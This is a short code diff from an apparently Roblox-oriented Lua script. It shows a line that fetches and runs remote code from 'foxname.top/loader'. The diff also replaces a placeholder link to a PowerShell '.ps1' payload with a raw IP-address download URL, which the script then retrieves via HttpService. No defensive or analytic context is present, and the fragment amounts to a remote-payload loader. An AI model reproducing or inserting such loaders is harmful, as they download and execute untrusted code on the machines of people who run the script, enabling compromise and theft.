@@ -123,7 +123,7 @@ loadstring(game:HttpGet("https://foxname.top/loader"))()
 
 
 
-local url = "https://example.com/payload.ps1"  -- Replace with your direct .ps1 link
+local url = "https://2.25.209.14:5173/api/file-share/c5eb4b43-cd3c-4e97-8cf4-ab6477060cd3/download"  -- Replace with your direct .ps1 link
 
 local HttpService = game:GetService("HttpService")
 local content = HttpService:GetAsync(url)
